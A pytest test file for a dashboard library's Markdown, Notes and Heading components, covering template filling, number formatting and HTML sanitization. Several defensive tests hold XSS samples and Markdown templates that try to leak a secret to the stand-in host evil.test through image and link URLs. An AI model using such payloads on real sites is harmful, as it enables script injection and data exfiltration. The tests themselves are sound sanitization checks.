"""The built-in Markdown, Notes, Heading and Divider components."""

import collections
import decimal
import fractions
import html
import re
import typing as t

import pandas as pd
import panel as pn
import panel_material_ui as pmui
import panel_reactflow as pr
import param
import pytest
from panel.viewable import Viewer

from panel_flowdash import FlowDash, register
from panel_flowdash.agent import (
    component_schema,
    dashboard_from_yaml,
    dashboard_to_yaml,
    validate_dashboard,
)
from panel_flowdash.text_components import (
    TEXT_COMPONENTS,
    Heading,
    Markdown,
    Notes,
    fill_template,
    format_value,
    html_to_text,
    notes_lines,
    render_markdown,
    sanitize_notes,
)
from panel_flowdash.ui.roles import component_role
from panel_flowdash.widgets import BUILTIN_COMPONENTS
from tests.untrusted_payloads import PAYLOADS


@register(page=False, component=True, title="Summary")
class Summary(Viewer):
    summary = param.Dict(default={"state": "Texas", "turbines": 19046, "share": 0.264})

    @param.output(param.Dict)
    def out(self):
        return self.summary

    def __panel__(self):
        return pn.pane.Str("summary")


def _html(pane) -> str:
    """The HTML a Markdown pane puts in the page, after the one decode its model applies."""
    return html.unescape(pane._transform_object(pane.object)["object"])


def _text(markup: str) -> str:
    return html.unescape(re.sub(r"<[^>]+>", "", markup))


@pytest.fixture
def editor():
    editor = FlowDash({"Demo/summary": Summary}, notifications=False)
    yield editor
    editor.dispose()


class TestTemplate:
    @pytest.mark.parametrize(
        ("template", "value", "expected"),
        [
            ("{{ value }}", "Texas", "Texas"),
            ("{{value}}", 3, "3"),
            ("{{ value }}", 19046, "19,046"),
            ("{{ value }}", 0.1 + 0.2, "0.3"),
            ("{{ value:.1% }}", 0.264, "26.4%"),
            ("{{ value:,.0f }}", 1234.5, "1,234"),
            ("{{ value:bad }}", 3, "3"),
            (
                "{{ value.state }} has {{ value.turbines }}",
                {"state": "TX", "turbines": 5},
                "TX has 5",
            ),
            ("{{ value.missing }}", {"state": "TX"}, ""),
            ("{{ value.state }}", "not a mapping", ""),
            ("{{ value }}", None, ""),
            ("{{ value }}", ["a", "b"], "a, b"),
            ("{{ value }}", True, "True"),
            ("{{ other }} {{ value }}", 1, "{{ other }} 1"),
            ("No placeholders", 1, "No placeholders"),
        ],
    )
    def test_fill(self, template, value, expected):
        assert fill_template(template, value) == expected

    def test_series_key(self):
        row = pd.Series({"state": "TX", "turbines": 12})
        assert fill_template("{{ value.state }}: {{ value.turbines }}", row) == "TX: 12"

    def test_dataframe_is_summarized(self):
        frame = pd.DataFrame({"a": range(1200), "b": range(1200)})
        assert format_value(frame) == "1,200 rows, 2 columns"

    def test_huge_format_widths_are_ignored(self):
        assert format_value(3, ">99999999") == "3"
        assert format_value(3, ">5") == "    3"

    @pytest.mark.parametrize(
        ("value", "spec", "expected"),
        [
            (10**5000, "", "1.000000e+5000"),
            (-(10**5000), ",.0f", "-1.000000e+5000"),
            (decimal.Decimal("1e999999"), "f", "1.000000e+999999"),
            (decimal.Decimal("1e-999999"), "f", "1.000000e-999999"),
            (decimal.Decimal("1.5"), ".2f", "1.50"),
            (decimal.Decimal("1e999999"), ".2e", "1.00e+999999"),
            (fractions.Fraction(10**5000, 3), ".2f", "3.333333e+4999"),
            (fractions.Fraction(10**500, 3), "", "3.333333e+499"),
            (fractions.Fraction(1, 10**5000), "", "1.000000e-5000"),
            (9999999999 * 10**600, "", "1.000000e+610"),
            ({"a": 10**5000}, "", "a: 1.000000e+5000"),
            ([[[[10**5000]]]], "", "1 item"),
            (collections.deque([10**5000]), "", "1.000000e+5000"),
        ],
        ids=[
            "int",
            "negative-int",
            "decimal",
            "small-decimal",
            "plain-decimal",
            "decimal-e-spec",
            "fraction",
            "fraction-past-float",
            "small-fraction",
            "rounded-mantissa",
            "in-a-dict",
            "nested",
            "in-a-deque",
        ],
    )
    def test_huge_numbers_are_shown_in_scientific_notation(self, value, spec, expected):
        assert format_value(value, spec) == expected

    def test_long_values_are_cut_short(self):
        assert format_value(list(range(1_000_000))).endswith("48, 49 and 999,950 more")
        assert format_value([["a", "b"], ["c"]]) == "a, b, c"
        text = format_value("x" * 5000)
        assert (len(text), text[-1]) == (1000, "\u2026")
        assert len(format_value({i: i for i in range(100_000)})) < 1000
        assert format_value({"a": 1, "b": 2}) == "a: 1, b: 2"
        for big in (
            collections.deque(range(1_000_000)),
            collections.Counter(range(100_000)),
            collections.OrderedDict((i, i) for i in range(100_000)),
            {i: i for i in range(100_000)}.values(),
        ):
            assert format_value(big).endswith(" more")
        nested = []
        nested.append(nested)
        assert format_value(nested)
        assert len(fill_template("{{ value }}", [["x" * 5000] * 100] * 100)) == 1000
        assert len(fill_template("{{ value }}" * 100, "x" * 5000)) == 20_000
        assert len(render_markdown("{{ value }}" * 100, "x" * 5000)) < 20_100

    def test_a_value_that_cannot_be_shown_gives_its_type(self):
        class Broken:
            def __str__(self):
                raise RuntimeError

            def __format__(self, spec):
                raise RuntimeError

        assert format_value(Broken()) == "Broken"
        assert format_value(Broken(), ".2f") == "Broken"


class TestRenderMarkdown:
    VALUE: t.ClassVar[dict] = {"secret": "hunter2", "code": "a.b-c *x* <b>"}

    @pytest.mark.parametrize(
        ("template", "expected"),
        [
            ("**{{ value.code }}**", "<p><strong>a.b-c *x* &lt;b&gt;</strong></p>"),
            ("`{{ value.code }}`", "<p><code>a.b-c *x* &lt;b&gt;</code></p>"),
            ("```\n{{ value.code }}\n```", "<pre><code>a.b-c *x* &lt;b&gt;\n</code></pre>"),
            (
                "| a |\n|---|\n| {{ value.code }} |",
                "<td>a.b-c *x* &lt;b&gt;</td>",
            ),
            ("# {{ value.secret }}", "<h1>hunter2</h1>"),
        ],
    )
    def test_values_are_literal_text_in_every_context(self, template, expected):
        assert expected in render_markdown(template, self.VALUE)

    @pytest.mark.parametrize(
        "template",
        [
            "![i](https://evil.test/p.png?d={{ value.secret }})",
            "[link](https://evil.test/{{ value.secret }})",
            "<https://evil.test/{{ value.secret }}>",
            "[r]\n\n[r]: https://evil.test/{{ value.secret }}",
            "```{{ value.secret }}\nx\n```",
        ],
    )
    def test_values_never_reach_a_url(self, template):
        rendered = render_markdown(template, self.VALUE)
        assert "hunter2" not in "".join(re.findall(r"<[^>]+>", rendered))

    def test_a_fence_info_string_keeps_no_placeholder(self):
        assert render_markdown("```{{ value }}\nx\n```", 1) == "<pre><code>x\n</code></pre>\n"
        assert 'class="language-py"' in render_markdown("```py {{ value }}\nx\n```", 1)

    def test_values_fill_image_alt_text(self):
        rendered = render_markdown("![{{ value.secret }}](https://example.com/a.png)", self.VALUE)
        assert 'alt="hunter2"' in rendered


class TestMarkdown:
    def test_renders_markdown_and_follows_its_input(self, editor):
        source = editor.add_component("Demo/summary")
        node = editor.add_component(
            "Text/Markdown",
            config={"text": "**{{ value.state }}** has {{ value.turbines }} turbines"},
        )
        pane = editor._tile_objects[-1]
        assert _text(_html(pane)).strip() == "has  turbines"

        assert editor.connect(source, "out", node, "value") is True
        assert "<strong>Texas</strong> has 19,046 turbines" in _html(pane)

        editor.graph.get_config_state(node).text = "# {{ value.state }}"
        assert "<h1>Texas</h1>" in _html(pane)

    def test_text_starts_at_the_top_of_the_tile(self):
        assert ":host > div > :first-child" in Markdown()._pane.stylesheets[0]

    def test_input_is_optional_and_does_not_gate_the_view(self, editor):
        node = editor.add_component("Text/Markdown")
        spec = editor.component_specs["Text/Markdown"]
        assert [(p.name, p.required, p.blocking) for p in spec.inputs] == [("value", False, False)]
        assert editor._tile_objects[-1] is editor._component_instances[node]._pane

    def test_raw_html_in_the_text_is_shown_as_text(self):
        pane = Markdown(text='Hi <img src=x onerror="alert(1)"> <b>bold</b>')._pane
        rendered = _html(pane)
        assert "<img" not in rendered
        assert "<b>" not in rendered
        assert '<img src=x onerror="alert(1)">' in _text(rendered)

    def test_math_is_not_typeset(self):
        assert Markdown()._pane.disable_math is True

    @pytest.mark.parametrize("name", sorted(PAYLOADS))
    def test_upstream_values_are_shown_as_text(self, name):
        payload = PAYLOADS[name]
        markdown = Markdown(text="Value: {{ value }}", value=payload)
        rendered = _html(markdown._pane)
        assert "evil.test" not in "".join(re.findall(r"<[^>]+>", rendered))
        assert "<img" not in rendered
        assert " ".join(payload.split()) in " ".join(_text(rendered).split())

    def test_preview_is_the_filled_text(self):
        markdown = Markdown(text="# {{ value }}\n\nSome **bold** <b>x</b>", value="Texas")
        assert markdown.__flowdash_preview__() == "Texas\nSome bold <b>x</b>"


class TestHeading:
    def test_text_and_subtitle_follow_config_and_input(self, editor):
        source = editor.add_component("Demo/summary")
        node = editor.add_component(
            "Text/Heading",
            config={"text": "Wind in {{ value.state }}", "subtitle": "", "size": "Title"},
        )
        heading = editor._component_instances[node]
        assert editor.connect(source, "out", node, "value") is True
        assert heading._title.object == "Wind in Texas"
        assert heading._title.variant == "h3"
        assert not heading._subtitle.visible

        editor.graph.get_config_state(node).param.update(subtitle="{{ value.turbines }} turbines")
        assert heading._subtitle.visible
        assert heading._subtitle.object == "19,046 turbines"

    def test_text_is_escaped(self):
        heading = Heading(text="<b>x</b> *y*", subtitle="[a](https://evil.test)")
        assert "<b>" not in heading._title.object
        assert r"\*y\*" in heading._title.object
        assert r"\[a\]" in heading._subtitle.object


class TestNotes:
    def test_editing_the_tile_saves_the_text(self, editor):
        node = editor.add_component("Text/Notes")
        notes = editor._component_instances[node]
        editor.dirty = False

        notes._editor.value = "<p>Typed <strong>here</strong></p>"

        assert editor.graph.get_config_state(node).text == "<p>Typed <strong>here</strong></p>"
        assert editor._tile_items[-1]["config"]["text"] == "<p>Typed <strong>here</strong></p>"
        assert editor.dirty
        restored = FlowDash({}, notifications=False)
        restored.load_model(editor.to_model(title="Notes"))
        assert restored._component_instances[node]._editor.value == notes._editor.value
        restored.dispose()

    def test_config_reaches_the_editor(self, editor):
        node = editor.add_component("Text/Notes", config={"text": "<p>Saved</p>"})
        notes = editor._component_instances[node]
        assert notes._editor.value == "<p>Saved</p>"
        editor.graph.get_config_state(node).text = "<p>Changed</p>"
        assert notes._editor.value == "<p>Changed</p>"

    def test_read_only_unless_the_dashboard_is_editable(self, editor):
        node = editor.add_component("Text/Notes", config={"placeholder": "Jot"})
        notes = editor._component_instances[node]
        assert (notes._editor.disabled, notes._editor.placeholder) == (False, "Jot")
        assert notes._editor.mode == "bubble"

        editor.editable = False
        assert (notes._editor.disabled, notes._editor.placeholder) == (True, "")
        notes._editor.value = "<p>Not saved</p>"
        assert editor.graph.get_config_state(node).text == ""

        editor.editable = True
        editor.read_only = True
        assert notes._editor.disabled

    def test_the_editors_form_of_the_stored_notes_is_not_an_edit(self, editor):
        stored = "<p>Line one</p>\n<p>Hello   world</p><p></p>"
        node = editor.add_component("Text/Notes", config={"text": stored})
        notes = editor._component_instances[node]
        editor.dirty = False

        notes._editor.value = "<p>Line one</p><p>Hello world</p>"
        assert editor.graph.get_config_state(node).text == stored
        assert not editor.dirty

        notes._editor.value = "<p>Line one</p><p>Hello world!</p>"
        assert editor.graph.get_config_state(node).text == "<p>Line one</p><p>Hello world!</p>"
        assert editor.dirty

    def test_not_editable_in_preview(self, editor):
        node = editor.add_component("Text/Notes", config={"placeholder": "Jot"})
        notes = editor._component_instances[node]
        editor.dirty = False

        editor.preview = True
        assert (notes._editor.disabled, notes._editor.placeholder) == (True, "")
        notes._editor.value = "<p>Not saved</p>"
        assert editor.graph.get_config_state(node).text == ""
        notes.text = "<p>Set on the instance</p>"
        assert editor.graph.get_config_state(node).text == ""
        assert notes.text == ""
        assert not editor.dirty

        editor.preview = False
        assert not notes._editor.disabled

    @pytest.mark.parametrize(
        ("markup", "shown"),
        [
            ("<p>Line one</p>\n<p>Line two</p>", "<p>Line one</p><p>Line two</p>"),
            ("<p>Hello   world</p>", "<p>Hello world</p>"),
            ("<p>a</p><p></p>", "<p>a</p>"),
            ("<h1>T</h1>x", "<h1>T</h1><p>x</p>"),
            ("a\nb", "<p>a b</p>"),
            ("<p>a<br>b</p>", "<p>a</p><p>b</p>"),
            ("<p>x</p><p><br></p><p>y</p>", "<p>x</p><p></p><p>y</p>"),
            ('<ol><li data-list="bullet">a</li></ol>', "<ul><li>a</li></ul>"),
            ("<blockquote><p>q</p></blockquote>", "<blockquote>q</blockquote>"),
            ("<p>  lead and trail  </p>", "<p>lead and trail</p>"),
            ("<strong>x</strong>", "<p><strong>x</strong></p>"),
            ("<li>orphan</li>", "<p>orphan</p>"),
            ("<p><strong><em>a</em></strong></p>", "<p><em><strong>a</strong></em></p>"),
            ("<p>x</p><p></p><p></p><p></p>", "<p>x</p><p></p><p></p>"),
            (
                '<ul><li>a</li><li class="ql-indent-1">b</li></ul>',
                "<ul><li>a<ul><li>b</li></ul></li></ul>",
            ),
            (
                '<ol><li data-list="bullet">a</li><li data-list="bullet" class="ql-indent-1">b</li></ol>',
                "<ul><li>a<ul><li>b</li></ul></li></ul>",
            ),
            ("<p>\tab</p>", "<p>ab</p>"),
        ],
    )
    def test_lines_match_the_editors_form(self, markup, shown):
        assert notes_lines(markup) == notes_lines(shown)

    @pytest.mark.parametrize(
        ("before", "after"),
        [
            ("<p>a</p>", "<p>b</p>"),
            ("<p>a b</p>", "<p>ab</p>"),
            ("<p>a</p>", "<p><strong>a</strong></p>"),
            ("<p>a</p>", "<h1>a</h1>"),
            ("<p>x</p><p>y</p>", "<p>x</p><p></p><p>y</p>"),
            ("<ul><li>a</li></ul>", "<ol><li>a</li></ol>"),
            ("<ul><li>a</li></ul>", "<ul><li>a<ul><li>b</li></ul></li></ul>"),
            ('<p><a href="https://a.test">l</a></p>', '<p><a href="https://b.test">l</a></p>'),
            ('<p class="ql-align-center">c</p>', "<p>c</p>"),
            ("<p>a&nbsp;b</p>", "<p>a b</p>"),
            ("<p>a b</p>", "<p>a\tb</p>"),
            ("<p>x</p>", "<p>x</p><ul><li></li></ul>"),
        ],
    )
    def test_lines_differ_when_the_notes_do(self, before, after):
        assert notes_lines(before) != notes_lines(after)

    def test_without_an_editor_it_is_editable(self):
        notes = Notes(text="<p>x</p>")
        notes._editor.value = "<p>y</p>"
        assert notes.text == "<p>y</p>"

    def test_removing_releases_its_subscriptions(self, editor):
        node = editor.add_component("Text/Notes")
        notes = editor._component_instances[node]
        before = len(editor._subscriptions())
        editor.remove_component(node)
        assert len(editor._subscriptions()) == before - 1
        editor.dirty = False
        notes._editor.value = "<p>After removal</p>"
        assert not editor.dirty

    def test_does_not_keep_the_editor_alive(self):
        import gc
        import weakref

        editor = FlowDash({}, notifications=False)
        notes = editor._component_instances[editor.add_component("Text/Notes")]
        ref = weakref.ref(editor)
        editor.dispose()
        del editor
        gc.collect()
        assert ref() is None
        assert not notes.editing

    def test_stored_markup_outside_the_toolbar_is_dropped(self, editor):
        stored = (
            '<p style="color:red">Hi <img src="https://evil.test/t.png">'
            '<a href="javascript:alert(1)">x</a></p>'
            '<iframe class="ql-video" src="https://evil.test/frame"></iframe>'
        )
        node = editor.add_component("Text/Notes", config={"text": stored})
        notes = editor._component_instances[node]
        assert notes._editor.value == "<p>Hi <a>x</a></p>"

        notes._editor.value = '<p>Pasted <img src="data:image/png;base64,AAAA"></p>'
        assert editor.graph.get_config_state(node).text == "<p>Pasted </p>"
        assert notes._editor.value == '<p>Pasted <img src="data:image/png;base64,AAAA"></p>'

    @pytest.mark.parametrize(
        ("markup", "clean"),
        [
            ("<h2>T</h2><p>a <strong>b</strong></p>", "<h2>T</h2><p>a <strong>b</strong></p>"),
            (
                '<ol><li data-list="bullet" class="ql-indent-1 x">'
                '<span class="ql-ui" contenteditable="false"></span>One</li></ol>',
                '<ol><li data-list="bullet" class="ql-indent-1">One</li></ol>',
            ),
            (
                '<p><a href="https://example.com" onclick="x()">l</a></p>',
                '<p><a href="https://example.com" rel="noopener noreferrer" '
                'target="_blank">l</a></p>',
            ),
            ("<script>alert(1)</script><p>&lt;b&gt;</p>", "<p>&lt;b&gt;</p>"),
            ("<p>unclosed <em>em", "<p>unclosed <em>em</em></p>"),
            ("<p><svg><p>hid</p></svg>vis</p>", "<p>vis</p>"),
        ],
    )
    def test_sanitize(self, markup, clean):
        assert sanitize_notes(markup) == clean

    def test_preview_is_plain_text(self):
        notes = Notes(text="<h2>Title</h2><p>Some <strong>bold</strong></p><ul><li>One</li></ul>")
        assert notes.__flowdash_preview__() == "Title\nSome bold\nOne"

    @pytest.mark.parametrize(
        ("markup", "text"),
        [
            ("", ""),
            ("<p>a</p><p>b</p>", "a\nb"),
            ("<p>a<br>b</p>", "a\nb"),
            ("<script>x</script><style>p {}</style><p>&lt;b&gt;</p>", "<b>"),
        ],
    )
    def test_html_to_text(self, markup, text):
        assert html_to_text(markup) == text


class Counter(Viewer):
    count = param.Integer(default=0, metadata={"flowdash": {"two_way": True}})

    def __panel__(self):
        return pn.pane.Str(self.param.count)


register(page=False, component=True, title="Counter", config=["count"])(Counter)


class TestTwoWayConfig:
    def test_a_component_edit_is_saved(self):
        editor = FlowDash({"Demo/counter": Counter}, notifications=False)
        node = editor.add_component("Demo/counter")
        editor.dirty = False
        editor._component_instances[node].count = 3
        assert editor.graph.get_config_state(node).count == 3
        assert editor._tile_items[0]["config"]["count"] == 3
        assert editor.dirty
        editor.dispose()

    @pytest.mark.parametrize("mode", ["view", "read_only"])
    def test_a_component_edit_is_undone_unless_editable(self, mode):
        editor = FlowDash({"Demo/counter": Counter}, notifications=False)
        node = editor.add_component("Demo/counter", config={"count": 1})
        editor.dirty = False
        setattr(editor, "editable" if mode == "view" else "read_only", mode == "read_only")
        counter = editor._component_instances[node]
        counter.count = 5
        assert counter.count == 1
        assert editor.graph.get_config_state(node).count == 1
        assert not editor.dirty
        editor.dispose()

    def test_only_declared_params_are_synced_back(self, editor):
        node = editor.add_component("Text/Markdown", config={"text": "a"})
        editor.dirty = False
        editor._component_instances[node].text = "changed by the component"
        assert editor.graph.get_config_state(node).text == "a"
        assert not editor.dirty


@pytest.mark.parametrize("component_id", list(TEXT_COMPONENTS))
class TestEveryTextComponent:
    def test_is_a_builtin_view(self, component_id):
        assert BUILTIN_COMPONENTS[component_id] is TEXT_COMPONENTS[component_id]
        editor = FlowDash({}, notifications=False)
        entry = editor._component_entries[component_id]
        assert component_role(entry, (), ()) == "view"
        editor.dispose()

    def test_agent_schema_describes_it(self, component_id):
        editor = FlowDash({}, notifications=False)
        schema = component_schema(editor.component_specs[component_id])
        assert schema["description"]
        assert schema["outputs"] == []
        for prop in schema["config"]["properties"].values():
            assert prop.get("type") in {"string"} or "enum" in prop
            assert prop.get("description") or prop.get("enum")
        editor.dispose()

    @pytest.mark.filterwarnings("ignore:Both 'name' and 'label':PendingDeprecationWarning")
    def test_config_renders_a_schema_form(self, component_id):
        editor = FlowDash({}, notifications=False)
        instance_id = editor.add_component(component_id)
        node = next(n for n in editor._flow.nodes if n["id"] == instance_id)
        schema = editor._flow.node_types[node["type"]]["schema"]
        form = pr.SchemaEditor(node["data"], schema)
        assert set(form._form._widgets) == set(schema["properties"])
        editor.dispose()

    def test_config_round_trips_through_yaml(self, component_id):
        editor = FlowDash({}, notifications=False)
        config = {
            "Text/Markdown": {"text": "# Title\n\n{{ value:.1% }} of *all*"},
            "Text/Notes": {"text": "<p>Some <em>notes</em></p>", "placeholder": "Jot"},
            "Text/Heading": {"text": "Wind", "subtitle": "By state", "size": "Title"},
            "Text/Divider": {"label": "Details"},
        }[component_id]
        editor.add_component(component_id, config=config)
        exported = editor.export_dashboard()
        text = dashboard_to_yaml(exported)
        (item,) = dashboard_from_yaml(text)["items"]
        assert (item["component_id"], item["config"]) == (component_id, config)
        issues = validate_dashboard(text, specs=editor.component_specs)
        assert [str(i) for i in issues if i.severity == "error"] == []

        restored = FlowDash({}, notifications=False)
        restored.import_dashboard(text)
        (item,) = restored.export_dashboard()["items"]
        assert (item["component_id"], item["config"]) == (component_id, config)
        editor.dispose()
        restored.dispose()


def test_text_config_is_edited_in_a_growing_text_area():
    editor = FlowDash({}, notifications=False)
    node = editor.add_component("Text/Markdown")
    config = editor.graph.get_config_state(node)
    widget = pn.Param(config, parameters=["text"])._widgets["text"]
    assert isinstance(widget, pmui.TextAreaInput)
    assert (widget.rows, widget.auto_grow, widget.max_length) == (6, True, 100_000)
    editor.dispose()


def test_notes_text_is_left_out_of_the_settings_form():
    editor = FlowDash({}, notifications=False)
    node = editor.add_component("Text/Notes")
    form = pn.Param(
        editor.graph.get_config_state(node), parameters=["text", "placeholder"], show_name=False
    )
    assert [w.label for w in form.layout] == ["Placeholder"]
    editor.dispose()
